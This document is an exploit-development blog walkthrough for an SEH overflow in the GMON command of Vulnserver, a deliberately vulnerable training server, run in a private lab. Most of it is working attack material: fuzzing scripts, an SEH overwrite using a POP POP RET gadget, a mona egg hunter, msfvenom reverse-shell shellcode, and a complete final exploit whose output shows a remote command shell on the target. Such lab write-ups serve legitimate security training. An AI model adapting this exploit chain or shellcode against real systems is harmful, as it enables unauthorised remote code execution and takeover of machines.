---
title: "Vulnserver GMON - SEH Overflow & Egg Hunting"
classes: wide
tag: 
  - "windows exploitation"
  - "vulnserver"
header:
  teaser: /assets/images/win-exp/windows-exp.png
ribbon: blue
description: "A simple walkthrough on  Vulnserver GMON SEH overflow & Egg hunting"
categories: ['Exploit-Development','Windows-Exploitation','Vulnserver']
---

- [Windows 10 Exploit Development - SEH Overflow & Egg Hunting](#windows-10-exploit-development---seh-overflow--egg-hunting)
  - [Structured Exception Handler (SEH)](#structured-exception-handler-seh)
  - [Spiking the GMON command](#spiking-the-gmon-command)
      - [NOTE](#note)
  - [Fuzzing the server](#fuzzing-the-server)
  - [Finding offsets](#finding-offsets)
  - [Overwriting SEH](#overwriting-seh)
  - [Finding bad characters](#finding-bad-characters)
  - [Redirecting code execution](#redirecting-code-execution)
  - [Stack pivoting](#stack-pivoting)
  - [Egg hunter](#egg-hunter)
  - [Crafting egg hunter](#crafting-egg-hunter)
  - [Crafting the shellcode](#crafting-the-shellcode)
  - [Exploitation](#exploitation)

## Structured Exception Handler (SEH)

Structured Exception Handler (SEH) is an ```error control mechanism``` used to prevent overflows on buffers. Windows SEH is an inbuilt function which ```triggers an exception```, when the buffer is overflowed and it prevents writing junk data into the ```Instruction Pointer```

These SEH are similar to exception handlers like, ```try-catch``` blocks

This structure ( also called a SEH record) is 8 bytes and has 2 (4 byte) elements :

- nSEH - A pointer to the next exception_registration structure (in essence, to the next SEH record, in case the current handler is unable the handle the exception)
- SEH - A pointer,  the address of the actual code of the exception handler. (SE Handler)

<div align="center">
<img src="https://www.corelan.be/wp-content/uploads/2009/07/image45.png" style="width:50%">
</div>

In order to exploit SEH overwrite, we need to have ```SafeSEH=Off``` and we should have the SEH within the application and our buffer should reach the SEH handler

From the corelan's blog


In other words, the payload must do the following things

-    cause an exception. Without an exception, the SEH handler (the one you have overwritten/control) won’t kick in
-    overwrite the pointer to the next SEH record with some jumpcode (so it can jump to the shellcode)
-    overwrite the SE handler with a pointer to an instruction that will bring you back to next SEH and execute the jumpcode.
-    The shellcode should be directly after the overwritten SE Handler. Some small jumpcode contained in the overwritten “pointer to next SEH record” will jump to it)



For more detailed information on SEH, check this [Corelan's](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/) blog

## Spiking the GMON command

On previous blog post in this series, we have seen ```Classic Vanilla Buffer Overflow``` where we would have overwrote ```EIP``` with large junk of data

But in this case it is not possible, because we will be facing a security mitigation known as ```SEH``` which is present in Windows by default

#### NOTE

- If you pass junks of data and get caught by SEH, try to overflow it to gain control
- If you can directly overwrite EIP, then it is easier to control the program when compared to SEH overflow

For this exploit, we will be using ```GMON``` command where ```SEH overflow``` can be done

Lets use ```boofuzz``` in python to test spiking this time,

To install boofuzz module in python,

```c
pip3 install boofuzz
```

The spiking script used to fuzz the ```GMON``` command is,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat spike.py     
#!/usr/bin/python
from boofuzz import *
host='192.168.116.140'
port=9999
session=Session(
        target=Target(
                connection=SocketConnection(host, port, proto='tcp')
        ),
        sleep_time = 3
)
s_initialize("spike")
s_string("GMON", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("vulnserver")
session.connect(s_get("spike"))
session.fuzz()
```

While running this, check for crash in the debugger to stop this script

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-spike-dbg.png">
</div>

Here we can clearly say that our program has been crashed by ```Access Violation``` error

Checking the registers to view the payload used to crash it by fuzzing and cross verifying it with fuzzing script,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-spike-1.png">
</div>

We have passed ```10,005 bytes``` to crash our program by spiking

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-spike-2.png">
</div>

We saw that our ```EIP``` is not overflown by the junk data we passed

Here comes ```SEH``` as a defensive mechanism to stop buffer overflows

To check SEH is triggered with exception or not, view the ```SEH Chain```

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-spike-seh.png">
</div>

Here we can see that SEH is filled with data from our fuzzing payload and triggered an exception

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-spike-python.png">
</div>

## Fuzzing the server

We have successfully crashed our server and the payload data begins with ```GMON /.``` which is made up of ```7 bytes```

Lets create a python script which generates payload data and fuzzes the payload length to crash the server,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat fuzzing.py      
import socket, sys
from time import sleep
payload=b"A"*500
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.116.140", 9999))
        s.send((b"GMON /."+payload))
        sleep(5)
        payload=payload+b"A"*500
    except:
        print("Fuzzing crashed at %s bytes"%(len(payload)))
        sys.exit() 
```

By running this script we will be crashing our server at a buffer size of ```nearly 5000 bytes```

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 fuzzing.py
Fuzzing crashed at 5000 bytes
```

Still, we are not sure about the approximate buffer space data need to create an overflow and offsets of ```nSEH``` and ```SEH```

## Finding offsets

By finding offset, we can locate the approximate buffer space size and nSEH & SEH offsets

To find the offset, we need to create a pattern and crash the program, so that the value in the registers/SEH can be used to find the offset

To create a pattern using ```metasploit```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ msf-pattern_create -l 5100
<GENERATED PATTERN>
```

Fuzzing with the created pattern to crash the program,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat offset.py       
import socket, sys
payload=b"<GENERATED PATTERN>"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 offset.py  
```

This will crash the program, where our buffer will get overflowed and fills the ```nSEH``` and ```SEH``` with the data from the pattern

Now, using the data from the ```SEH Chain``` we are going to locate the offset

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-offset.png">
</div>

Finding the offset using ```metasploit```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ msf-pattern_offset -q 45336F45
[*] Exact match at offset 3549
```

We can also locate offset using ```mona``` by ```!mona findmsp```,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-offset-mona.png">
</div>

So, our ```nSEH``` is present at the offset of ```3549 bytes``` in the data

## Overwriting SEH

Now, we have found the offset of our ```SEH handlers```

It’s time to control the SEH, which is the first important phase of this exploitation

Lets craft a script to overwrite the SEH with our own custom data, which will be further used to craft an exploit

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat overwrite-seh.py 
import socket, sys
# to overwrite buffer and EBP
payload=b"A"*3549
# to overwrite nSEH
payload+=b"B"*4
# to overwrite SEH
payload+=b"C"*4
payload+=b"D"*(5000-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.141", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 overwrite-seh.py  

```

We have crashed our program and succesfully overwrote the SEH with our own values

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-overwrite-seh.png">
</div>

Our ```nSEH``` and ```SEH``` is filled with our own data correctly, so it fits now

Here ```0x43434343``` will be placed in EIP if there is no exception caused by SEH

For now, we could control SEH at runtime and the data in SEH is from our buffer payload, which will be used to reach EIP

## Finding bad characters

After controlling SEH, it is mandatory to check for bad characters

Because bad characters may damage your shellcode execution which may result in ```exploitation failure```

To find bad characters manually using debugger, run this python script

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat badchars.py 
import socket, sys
# collection of bad characters except \x00
badchars=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# to overwrite buffer and EBP
payload=b"A"*3549
# to overwrite nSEH
payload+=b"B"*4
# to overwrite SEH
payload+=b"C"*4
# badchars on ECX
payload+=badchars
# padding
payload+=b"D"*(5000-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 badchars.py  
```

You could see the hexdump of the ECX data after SEH and you could manually figure out which are the bad characters

Select the address on the ECX register, right click on it and select follow hex dump

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-badchar-dump.png">
</div>

Seems like we don’t have any bad characters, except ```x00``` which is also known as ```null byte``` (It’s always considered as a bad character while exploitation, often used to terminated string sequences)

## Redirecting code execution

As for now, we can control the ```SEH``` and also we have only one bad character ```x00```,

Since we can control SEH handlers, we can use this as our advantage to overflow it and redirect the code flow to any part of the memory where it is perfect to have shellcode execution along with our egg hunter

Lets find ```POP POP RET``` for abusing SEH to get perfect redirection using ```!mona seh```,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-mona-seh.png">
</div>

Here we cam see there are 18 pointers with the ```POP POP RET``` gadget where security mitigations like ASLR is disabled for all pointers

This will be suitable for our exploitation, since the address of these gadgets will be ```static``` because ASLR is disabled and we can use any gadget for this exploit

Lets use the address of the first gadget, ```0x625010b4``` and overwrite the SEH 

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat overwrite-gadget.py                
import socket, sys
# to overwrite buffer and EBP
payload=b"A"*3549
# to overwrite nSEH
#payload+=b"C"*4
# to overwrite SEH
payload+=b"\xb4\x10\x50\x62" #pop-pop-ret gadget
# padding
payload+=b"D"*(5000-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 overwrite-gadget.py
```

Here we can see that our ```SEH pointer``` is being filled by ```POP POP RET``` gadget address

Set a breakpoint at ```0x625010b4``` and proceed the execution with ```Shift+f9``` to check that we are hitting the gadget or not

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-overwrite-gadget.png">
</div>

So we are able to hit the ```PPR Gadget``` and also we can control the SEH with our own values

If we follow the stack after the POP-POP and RET, we will be seeing the data from our payload

Our ```nSEH``` value ```BBBB``` which is stored as ```0x42424242``` in stack will be executed next to the ```RET``` from the gadget

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-overwrite-breakpoint-into.png">
</div>

So by abusing the stack with ```PPR Gadget```, we will be redirected into the payload memory which we sent

We can use this as our advantage to place our ```egg hunter``` to execute and search our shellcode

## Stack pivoting

Stack pivoting is a technique in exploitation where we will be drifting in stack memory to make our own shellcode execute

We have placed our ```PPR Gadget``` into SEH, so we have other ```4 bytes``` in ```nSEH```

We can use this 4 bytes to perform a drift in memory, which will be executed after PPR gadget

Lets create the opcode value to drift back ```50 bytes``` using ```nasm-shell```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ /usr/bin/msf-nasm_shell
nasm > jmp short -0x32
00000000  EBCC              jmp short 0xffffffce
```

Adding this opcode in our python script,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat overwrite-nseh.py
import socket, sys
# to overwrite buffer and EBP
payload=b"A"*3549
# to overwrite nSEH
payload+=b"\xeb\xcc"
payload+=b"\x90\x90" // need 4 bytes, so padded with 2 NOPS
# to overwrite SEH
payload+=b"\xb4\x10\x50\x62"
# padding
payload+=b"D"*(5000-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 overwrite-nseh.py
```

After crashing the server, we can see this after executing ```RET``` from our ```PPR Gadget```

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-jump-1.png">
</div>

Our opcode is placed perfectly and it allows us to jump in the stack memory backwards

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-jump-2.png">
</div>

Now it is perfect to place our ```egg hunter``` at this memory region so that we can drift back and execute our egg hunter with NOPS to reach our shellcode

## Egg hunter

Egg hunter is a piece of code or a ```small shellcode``` used to find an egg and large size shellcode in the ```virtual address space``` of the process

Egg hunters are used in a situation where memory becomes a limited constraint while exploitation

It is the first stage of a ```multi staged payload``` searches for a pattern, ```EGG``` and executes that location where the pattern is stored

Egg is an ```unique small 4 byte``` data added infront of a shellcode, so that the egg hunter can easily identify the egg (If an egg is MONI, egg hunter searches in a pattern of MONIMONI) and execute the shellcode after it

For more on [Egg Hunting](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)

## Crafting egg hunter

We could easily craft an ```egg hunter``` using ```mona``` 

For x64 Windows 10,

```c
!mona egg -t PWND -wow64 -winver 10
```

It is always best to give your egg name in upper case and in a length of 4 bytes

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-mona-egg.png">
</div>

So we have created an ```egg hunter``` with a size of ```50 bytes```

Since our egg hunter is 50 bytes large, we have to change the opcode to drift back more than 50 bytes

```c
nasm > jmp short -0x48 //75 bytes
00000000  EBB6              jmp short 0xffffffb8
```

Placing the egg hunter inside our python script,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat egghunter.py
import socket, sys

egg=b""
egg+=b"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
egg+=b"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
egg+=b"\x05\x74\xdf\xb8\x50\x57\x4e\x44\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
egg+=b"\xff\xe7"

nseh=b""
nseh=b"\xeb\xb6"
nseh+=b"\x90\x90"

seh=b"\xb4\x10\x50\x62"

payload=b""
# to overwrite buffer and EBP
# NOP sled
payload+=b"\x90"*(3549-70)
# egghunter
payload+=egg
payload+=b"A"*(3549-len(payload))

# to overwrite nSEH
payload+=nseh
# to overwrite SEH
payload+=seh
# padding
payload+=b"D"*(5000-len(payload))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()


┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 egghunter.py
```

After running this, our program crashes and we will be drifted back 75 bytes from nSEH and we will be ahead of our egg hunter while executing it in runtime

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-egg-drift.png">
</div>

So we can control SEH and drift back in memory and reach our egg hunter too

## Crafting the shellcode

Lets generate the shellcode for our reverse shell using ```msfvenom```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.116.128 LPORT=9876 -f python -e x86/shikata_ga_nai -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xb8\xbb\xf1\x65\xd4\xdd\xc1\xd9\x74\x24\xf4\x5e\x31"
buf += b"\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\x55\x0d\x87"
buf += b"\x21\x55\x06\xca\xca\xa5\xd7\xab\x43\x40\xe6\xeb\x30"
buf += b"\x01\x59\xdc\x33\x47\x56\x97\x16\x73\xed\xd5\xbe\x74"
buf += b"\x46\x53\x99\xbb\x57\xc8\xd9\xda\xdb\x13\x0e\x3c\xe5"
buf += b"\xdb\x43\x3d\x22\x01\xa9\x6f\xfb\x4d\x1c\x9f\x88\x18"
buf += b"\x9d\x14\xc2\x8d\xa5\xc9\x93\xac\x84\x5c\xaf\xf6\x06"
buf += b"\x5f\x7c\x83\x0e\x47\x61\xae\xd9\xfc\x51\x44\xd8\xd4"
buf += b"\xab\xa5\x77\x19\x04\x54\x89\x5e\xa3\x87\xfc\x96\xd7"
buf += b"\x3a\x07\x6d\xa5\xe0\x82\x75\x0d\x62\x34\x51\xaf\xa7"
buf += b"\xa3\x12\xa3\x0c\xa7\x7c\xa0\x93\x64\xf7\xdc\x18\x8b"
buf += b"\xd7\x54\x5a\xa8\xf3\x3d\x38\xd1\xa2\x9b\xef\xee\xb4"
buf += b"\x43\x4f\x4b\xbf\x6e\x84\xe6\xe2\xe6\x69\xcb\x1c\xf7"
buf += b"\xe5\x5c\x6f\xc5\xaa\xf6\xe7\x65\x22\xd1\xf0\x8a\x19"
buf += b"\xa5\x6e\x75\xa2\xd6\xa7\xb2\xf6\x86\xdf\x13\x77\x4d"
buf += b"\x1f\x9b\xa2\xc2\x4f\x33\x1d\xa3\x3f\xf3\xcd\x4b\x55"
buf += b"\xfc\x32\x6b\x56\xd6\x5a\x06\xad\xb1\xa4\x7f\xd9\xc1"
buf += b"\x4d\x82\x21\xe4\x19\x0b\xc7\x82\x31\x5a\x50\x3b\xab"
buf += b"\xc7\x2a\xda\x34\xd2\x57\xdc\xbf\xd1\xa8\x93\x37\x9f"
buf += b"\xba\x44\xb8\xea\xe0\xc3\xc7\xc0\x8c\x88\x5a\x8f\x4c"
buf += b"\xc6\x46\x18\x1b\x8f\xb9\x51\xc9\x3d\xe3\xcb\xef\xbf"
buf += b"\x75\x33\xab\x1b\x46\xba\x32\xe9\xf2\x98\x24\x37\xfa"
buf += b"\xa4\x10\xe7\xad\x72\xce\x41\x04\x35\xb8\x1b\xfb\x9f"
buf += b"\x2c\xdd\x37\x20\x2a\xe2\x1d\xd6\xd2\x53\xc8\xaf\xed"
buf += b"\x5c\x9c\x27\x96\x80\x3c\xc7\x4d\x01\x4c\x82\xcf\x20"
buf += b"\xc5\x4b\x9a\x70\x88\x6b\x71\xb6\xb5\xef\x73\x47\x42"
buf += b"\xef\xf6\x42\x0e\xb7\xeb\x3e\x1f\x52\x0b\xec\x20\x77"
```

Changing junk characters (A's) into ```NOPS``` (\x90)

Since our shellcode is large, we could not place it in ESP and attack it like a classic buffer overflow

We have to place it in between the buffer data and use our egg hunter to find and execute the shellcode

## Exploitation

Now we have gone through every steps and crafted our final exploit to gain shell on our target machine

Adding the string ```PWNDPWND``` as ```egg``` in front our shellcode, so that our egg hunter will find it

The block diagram for our whole exploitation

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/gmon-exploit-block.png">
</div>

Here is our exploit script,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ cat exploit.py       
import socket, sys

egg=b"PWNDPWND"

egghunter=b""
egghunter+=b"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
egghunter+=b"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
egghunter+=b"\x05\x74\xdf\xb8\x50\x57\x4e\x44\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
egghunter+=b"\xff\xe7"

buf= b""
buf+=b"\xb8\xbb\xf1\x65\xd4\xdd\xc1\xd9\x74\x24\xf4\x5e\x31"
buf+=b"\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\x55\x0d\x87"
buf+=b"\x21\x55\x06\xca\xca\xa5\xd7\xab\x43\x40\xe6\xeb\x30"
buf+=b"\x01\x59\xdc\x33\x47\x56\x97\x16\x73\xed\xd5\xbe\x74"
buf+=b"\x46\x53\x99\xbb\x57\xc8\xd9\xda\xdb\x13\x0e\x3c\xe5"
buf+=b"\xdb\x43\x3d\x22\x01\xa9\x6f\xfb\x4d\x1c\x9f\x88\x18"
buf+=b"\x9d\x14\xc2\x8d\xa5\xc9\x93\xac\x84\x5c\xaf\xf6\x06"
buf+=b"\x5f\x7c\x83\x0e\x47\x61\xae\xd9\xfc\x51\x44\xd8\xd4"
buf+=b"\xab\xa5\x77\x19\x04\x54\x89\x5e\xa3\x87\xfc\x96\xd7"
buf+=b"\x3a\x07\x6d\xa5\xe0\x82\x75\x0d\x62\x34\x51\xaf\xa7"
buf+=b"\xa3\x12\xa3\x0c\xa7\x7c\xa0\x93\x64\xf7\xdc\x18\x8b"
buf+=b"\xd7\x54\x5a\xa8\xf3\x3d\x38\xd1\xa2\x9b\xef\xee\xb4"
buf+=b"\x43\x4f\x4b\xbf\x6e\x84\xe6\xe2\xe6\x69\xcb\x1c\xf7"
buf+=b"\xe5\x5c\x6f\xc5\xaa\xf6\xe7\x65\x22\xd1\xf0\x8a\x19"
buf+=b"\xa5\x6e\x75\xa2\xd6\xa7\xb2\xf6\x86\xdf\x13\x77\x4d"
buf+=b"\x1f\x9b\xa2\xc2\x4f\x33\x1d\xa3\x3f\xf3\xcd\x4b\x55"
buf+=b"\xfc\x32\x6b\x56\xd6\x5a\x06\xad\xb1\xa4\x7f\xd9\xc1"
buf+=b"\x4d\x82\x21\xe4\x19\x0b\xc7\x82\x31\x5a\x50\x3b\xab"
buf+=b"\xc7\x2a\xda\x34\xd2\x57\xdc\xbf\xd1\xa8\x93\x37\x9f"
buf+=b"\xba\x44\xb8\xea\xe0\xc3\xc7\xc0\x8c\x88\x5a\x8f\x4c"
buf+=b"\xc6\x46\x18\x1b\x8f\xb9\x51\xc9\x3d\xe3\xcb\xef\xbf"
buf+=b"\x75\x33\xab\x1b\x46\xba\x32\xe9\xf2\x98\x24\x37\xfa"
buf+=b"\xa4\x10\xe7\xad\x72\xce\x41\x04\x35\xb8\x1b\xfb\x9f"
buf+=b"\x2c\xdd\x37\x20\x2a\xe2\x1d\xd6\xd2\x53\xc8\xaf\xed"
buf+=b"\x5c\x9c\x27\x96\x80\x3c\xc7\x4d\x01\x4c\x82\xcf\x20"
buf+=b"\xc5\x4b\x9a\x70\x88\x6b\x71\xb6\xb5\xef\x73\x47\x42"
buf+=b"\xef\xf6\x42\x0e\xb7\xeb\x3e\x1f\x52\x0b\xec\x20\x77"

nseh=b""
nseh=b"\xeb\xb6"
nseh+=b"\x90\x90"

seh=b"\xb4\x10\x50\x62"

# to overwrite buffer and EBP
payload=b""
payload+=b"A"*1500
## egg
payload+=egg
## shellcode
payload+=buf
## NOP sled
payload+=b"\x90"*(3549-70-len(payload))
## egg hunter
payload+=egghunter
payload+=b"\x90"*(3549-len(payload))

# to overwrite nSEH
payload+=nseh

# to overwrite SEH
payload+=seh

# padding
payload+=b"D"*(5000-len(payload))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()
```

Since we are running this application as a high privileged user, by running this exploit we should gain shell as the same user

Lets try running our exploit when the application is running as privileged user without debugger,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ python3 exploit.py
```

By running our final exploit we will get our shell on the target machine

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ nc -nlvp 9876
listening on [any] 9876 ...
connect to [192.168.116.128] from (UNKNOWN) [192.168.116.140] 49792
Microsoft Windows [Version 10.0.19044.1288]
(c) Microsoft Corporation. All rights reserved.

C:\vulnserver-master\vulnserver-master>whoami
whoami
vulnserver\winexp

C:\vulnserver-master\vulnserver-master> 
```

